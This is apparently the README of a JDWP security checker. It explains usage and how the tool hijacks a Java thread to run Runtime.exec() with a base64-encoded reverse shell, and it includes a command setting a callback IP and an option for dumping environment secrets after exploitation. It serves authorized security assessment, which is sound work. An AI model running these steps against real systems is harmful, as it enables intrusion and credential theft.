# jdwp-check - JDWP Remote Code Execution Checker

Checks exposed Java Debug Wire Protocol (JDWP) endpoints for unauthenticated access and remote code execution.

JDWP is unauthenticated by design. Any externally reachable JDWP port allows arbitrary code execution as the Java process user. A confirmed handshake alone is a **critical finding**.

## What it does

1. **Port check** TCP connect to verify the port is reachable
2. **JDWP handshake** Sends `JDWP-Handshake` and checks for the expected echo
3. **RCE verification** Connects via JDWP, sets a breakpoint, hijacks a thread, and calls `Runtime.exec()` with a reverse shell payload

The RCE engine is a full Python 3 port of [jdwp-shellifier](https://github.com/IOActive/jdwp-shellifier) by @_hugsy_ (IOActive) (Sending Love <3). Integrated directly, no external dependencies.

## Requirements

- **Python 3.8+** (zero pip dependencies, stdlib only)
- `netcat` (nc) - for catching reverse shells during RCE checks (pre-installed on Kali/Parrot)

## Usage

```bash
# Basic scan with RCE check
python3 jdwp_check.py -t targets.txt

# Specify callback IP and port for reverse shell
python3 jdwp_check.py -t targets.txt --callback-ip 10.0.0.5 --callback-port 4444

# Handshake-only mode (no reverse shell, no netcat needed)
python3 jdwp_check.py -t targets.txt --handshake-only

# Custom breakpoint method (if default doesn't trigger)
python3 jdwp_check.py -t targets.txt --break-on java.net.ServerSocket.accept

# Dump environment variables after RCE (credentials, secrets, paths)
python3 jdwp_check.py -t targets.txt --env

# Disable colors (e.g. for piping to file)
python3 jdwp_check.py -t targets.txt --no-color
```

## Target file format

One target per line. Lines starting with `#` are comments.

```
IP:PORT
IP:PORT|HOSTNAME
IP:PORT|HOSTNAME|JAVA_VERSION
```

See `targets.example.txt` for a sample.

## Options

| Flag | Default | Description |
|------|---------|-------------|
| `-t, --targets` | *required* | Path to target file |
| `--callback-ip` | auto-detect | Your IP for reverse shell callbacks |
| `--callback-port` | 44444 | Listener port for reverse shells |
| `--break-on` | `java.lang.String.valueOf` | Java method to try first (auto-fallback on timeout) |
| `--timeout` | 15 | JDWP exploit timeout (seconds) |
| `--connect-timeout` | 5 | TCP connect timeout (seconds) |
| `--shell-wait` | 5 | Wait time for reverse shell connect |
| `--pause` | 5 | Pause between targets (seconds) |
| `--env` | off | Dump environment variables after successful RCE |
| `--handshake-only` | off | Skip RCE, only check handshakes |
| `--no-color` | off | Disable ANSI colors |

## How the RCE works

The integrated exploit follows the same approach as jdwp-shellifier:

1. **JDWP connect** Full protocol handshake, enumerate classes and methods
2. **Breakpoint** Set a breakpoint on a frequently called method (default: `java.lang.String.valueOf`). If the method doesn't trigger within the timeout, automatically falls back through `ServerSocket.accept` → `Thread.sleep` → `ClassLoader.loadClass` → `Socket.connect`
3. **Thread hijack** When the breakpoint fires, hijack that thread's execution context
4. **Runtime.exec()** Call `Runtime.getRuntime().exec()` with a base64-encoded reverse shell
5. **Callback** A netcat listener catches the incoming shell and confirms RCE

The reverse shell payload uses the `{echo,BASE64}|{base64,-d}|bash` bypass to avoid issues with `Runtime.exec()` argument parsing.

## Exit codes

| Code | Meaning |
|------|---------|
| 0 | No JDWP exposure found |
| 1 | JDWP handshake confirmed (critical) |
| 2 | Remote code execution confirmed (critical) |

## Output

Results are printed to stdout and logged to `jdwp_results_YYYYMMDD_HHMMSS.txt` in the current directory.

## Credits

RCE engine based on [jdwp-shellifier](https://github.com/IOActive/jdwp-shellifier) by [@_hugsy_](https://twitter.com/_hugsy_) (IOActive), ported to Python 3 and integrated.

## Disclaimer

This tool is intended for authorized penetration testing and security assessments only. Unauthorized access to computer systems is illegal. Always obtain proper written authorization before testing.

## References

JDWP is unauthenticated by design. There is no CVE for the protocol itself, because it is working as intended. The vulnerability is the exposure, not a software bug. That said, there are relevant references for reporting:

| Reference | Description |
|-----------|-------------|
| [CWE-489](https://cwe.mitre.org/data/definitions/489.html) | Active Debug Code — the primary CWE for exposed debug interfaces |
| [CVE-2023-49693](https://nvd.nist.gov/vuln/detail/CVE-2023-49693) | NETGEAR ProSAFE NMS: JDWP on port 11611 exposed without auth → RCE |
| [CVE-2015-0545](https://nvd.nist.gov/vuln/detail/CVE-2015-0545) | EMC Unisphere for VMAX: JDWP service exposed → RCE (CVSS 10.0) |
| [CVE-2021-20032](https://nvd.nist.gov/vuln/detail/CVE-2021-20032) | SonicWall Analytics: JDWP exposed → RCE |
| [CVE-2016-5573](https://bugzilla.redhat.com/show_bug.cgi?id=1385544) | OpenJDK: Insufficient checks of JDWP packets (Hotspot) |
| [EDB-46501](https://www.exploit-db.com/exploits/46501) | jdwp-shellifier — public exploit on Exploit-DB |
| [Wiz Research](https://www.wiz.io/blog/exposed-jdwp-exploited-in-the-wild) | JDWP actively exploited in the wild, 6,000+ IPs scanning (2024) |

## Author

**ChiZu** [github.com/G0ldSec](https://github.com/G0ldSec)

## License

MIT
